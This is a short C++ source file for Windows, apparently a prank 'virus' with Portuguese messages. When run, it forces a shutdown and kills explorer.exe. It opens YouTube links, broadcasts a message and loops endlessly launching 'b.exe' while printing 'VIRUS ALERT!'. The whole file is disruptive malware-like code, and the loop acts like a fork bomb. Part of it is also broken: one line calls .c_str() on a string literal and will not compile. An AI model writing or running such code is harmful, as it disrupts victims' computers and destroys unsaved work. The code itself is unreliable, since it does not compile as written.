#include <string.h>
#include <iostream>
#include <windows.h>
#include <locale>

using namespace std;

int main(){
	setlocale(LC_ALL, "portuguese");
	int i;
	string shutdown = "shutdown.exe /s /t 5";
	system(shutdown.c_str());
	system("dir".c_str());
	string com = "taskkill /im explorer.exe -f";
	system(com.c_str());
	string yt3 = "start https://www.youtube.com/watch?v=9P2JG8dWwJ4";
	system(yt3.c_str());
	string yt2 = "start https://www.youtube.com/watch?v=SpraEYhy518&t=284s";
	system(yt2.c_str());
	string mensagem = "msg * Ja foi <3";
	system(mensagem.c_str());
	string yt = "start https://www.youtube.com/watch?v=9I_L6iCP1_g";
	system(yt.c_str());
	string txt = "start notepad.exe";
	system(txt.c_str());
	for(i=0;i<=i;i++){
	string b = "start b.exe";
	system(b.c_str());
	cout<<"   ! . # HAHHAHAHAHAHAHA PC JA ERA                      __---__             ";
	cout<<"    VIRUS ALERT!        . 101101      ";
	}
}